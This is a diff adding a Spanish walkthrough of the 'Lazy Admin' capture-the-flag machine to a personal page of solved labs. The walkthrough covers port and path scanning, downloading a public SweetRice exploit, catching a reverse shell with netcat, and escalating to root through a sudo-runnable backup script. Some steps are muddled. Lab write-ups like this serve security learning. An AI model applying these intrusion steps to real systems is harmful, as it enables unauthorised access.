@@ -23,6 +23,94 @@
                       
     <h2 onclick="toggleDetails('maquinas-resueltas')">Máquinas Virtuales Resueltas</h2>
             <div id="maquinas-resueltas" class="details">
+
+<div id="lazy-admin">
+    <h3 onclick="toggleDetails('lazy-admin-details')">Lazy Admin</h3>
+    <div id="lazy-admin-details" class="details">
+        <img src="https://sirpeca.github.io/imagenes/maqresolv/lazyadmin.jpg" alt="Lazy Admin" class="image">
+        <h4 onclick="toggleDetails('lazy-admin-enumeracion')">1. Enumeración:</h4>
+        <div id="lazy-admin-enumeracion" class="details">
+            <h5>1.1 Comprobación de la disponibilidad de la máquina:</h5>
+            <p class="prompt">ping -c 1 &lt;ip&gt;</p>
+            <p>Este comando se utiliza para verificar si la máquina virtual está activa.</p>
+
+            <h5>1.2 Escaneo de puertos abiertos:</h5>
+            <p class="prompt">nmap -sC -sV &lt;ip&gt; -oN nmap</p>
+            <p>Se utiliza Nmap para escanear los puertos abiertos en la máquina virtual.</p>
+
+            <h5>1.3 Examinar la página web:</h5>
+            <p class="prompt">firefox http://&lt;ip&gt;</p>
+            <p>Se utiliza Firefox para visitar la página web alojada en la máquina virtual.</p>
+
+            <h5>1.4 Enumerar las rutas HTTP:</h5>
+            <p class="prompt">wfuzz -c -L -t 400 --sc=200,301 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt http://&lt;ip&gt;/FUZZ</p>
+            <p>Se utiliza wfuzz para enumerar las rutas HTTP.</p>
+        </div>
+        
+        <h4 onclick="toggleDetails('lazy-admin-explotacion')">2. Explotación:</h4>
+        <div id="lazy-admin-explotacion" class="details">
+            <h5>2.1 Explorar la ruta "/content":</h5>
+            <p class="prompt">firefox http://&lt;ip&gt;/content</p>
+            <p>Se utiliza Firefox para visitar la ruta /content en la máquina virtual.</p>
+
+            <h5>2.2 Buscar un exploit para SweetRice:</h5>
+            <p class="prompt">searchsploit sweetrice</p>
+            <p>Searchsploit es una herramienta que indexa exploits de diversas bases de datos públicas.</p>
+
+            <h5>2.3 Descargar y ejecutar el exploit:</h5>
+            <p class="prompt">wget https://www.exploit-db.com/exploits/44128/ -O exploit.sh</p>
+            <p>Se descarga el exploit específico para SweetRice desde Exploit Database.</p>
+
+            <h5>2.4 Crear una reverse shell:</h5>
+            <p class="prompt">nano exploit.html</p>
+            <p>Se utiliza el editor de texto nano para crear un archivo HTML llamado exploit.html.</p>
+
+            <h5>2.5 Iniciar una escucha en la máquina atacante:</h5>
+            <p class="prompt">nc -lvnp 1234</p>
+            <p>Se inicia Netcat en modo de escucha en el puerto 1234 para recibir la conexión de la reverse shell.</p>
+
+            <h5>2.6 Ejecutar el exploit en la máquina virtual:</h5>
+            <p class="prompt">firefox exploit.html</p>
+            <p>Se utiliza Firefox para visitar el archivo HTML exploit.html.</p>
+
+            <h5>2.7 Obtener una shell en la máquina virtual:</h5>
+            <p class="prompt">stty raw -echo fg</p>
+            <p>Estos comandos se utilizan para ajustar la shell interactiva obtenida de la reverse shell.</p>
+        </div>
+        
+        <h4 onclick="toggleDetails('lazy-admin-escalada')">3. Escalada de privilegios:</h4>
+        <div id="lazy-admin-escalada" class="details">
+            <h5>3.1 Comprobar los permisos de sudo:</h5>
+            <p class="prompt">sudo -l</p>
+            <p>Este comando muestra los comandos que el usuario actual puede ejecutar con privilegios de sudo.</p>
+
+            <h5>3.2 Modificar el script backup.pl:</h5>
+            <p class="prompt">nano /etc/copy.sh</p>
+            <p>Se utiliza el editor de texto nano para modificar el script backup.pl.</p>
+
+            <h5>3.3 Reemplazar la IP en el script con la IP de tu máquina atacante.</h5>
+
+            <h5>3.4 Iniciar una escucha en tu máquina atacante:</h5>
+            <p class="prompt">nc -lvnp 5554</p>
+            <p>Se inicia Netcat en modo de escucha en el puerto 5554 para recibir la conexión de la copia de seguridad modificada.</p>
+
+            <h5>3.5 Ejecutar el script backup.pl:</h5>
+            <p class="prompt">sudo /usr/bin/perl /home/itguy/backup.pl</p>
+            <p>Se ejecuta el script backup.pl con privilegios de sudo, que ahora apunta a la IP de la máquina atacante.</p>
+
+            <h5>3.6 Obtener acceso como root:</h5>
+            <p class="prompt">su</p>
+            <p>Se utiliza el comando su para cambiar al usuario root.</p>
+        </div>
+
+        <h4 onclick="toggleDetails('lazy-admin-captura')">4. Capturar la bandera:</h4>
+        <div id="lazy-admin-captura" class="details">
+            <p class="prompt">cat root.txt</p>
+            <p>Este comando lee y muestra el contenido del archivo root.txt, que contiene la flag de root.</p>
+        </div>
+    </div>
+</div>
+
 <div id="Agen-Sudo">
     <h3 onclick="toggleDetails('agen-sudo-details')">Agent Sudo</h3>
     <div id="agen-sudo-details" class="details">
